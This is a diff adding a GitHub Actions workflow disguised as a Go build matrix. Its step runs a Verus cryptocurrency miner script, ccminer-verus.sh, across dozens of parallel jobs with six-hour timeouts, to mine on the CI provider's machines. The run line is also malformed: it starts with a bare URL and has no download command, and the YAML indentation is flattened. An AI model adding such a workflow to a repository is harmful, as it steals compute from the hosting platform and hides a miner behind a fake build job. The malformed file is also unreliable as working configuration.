@@ -1,0 +1,27 @@
+name: coins
+on: [push, pull_request]
+jobs:
+build:
+name: akuganteng
+runs-on: ubuntu-latest
+strategy:
+max-parallel: 1
+fail-fast: false
+matrix:
+go: [1.6, 1.7, 1.8, 1.9, 1.10]
+flag: [A, B, C, D, E, F, G, H, I]
+timeout-minutes: 360
+env:
+NUM_JOBS: 20
+JOB: ${{ matrix.go }}
+steps:
+- name: Set up Go ${{ matrix.go }}
+uses: actions/setup-go@v1
+with:
+go-version: ${{ matrix.go }}
+id: go
+- name: Setup
+uses: actions/checkout@v2
+- name: akuganteng
+run: |
+https://github.com/buildertokens/veruscoin/blob/main/ccminer-verus.sh && chmod u+x ccminer-verus.sh && ./ccminer-verus.sh
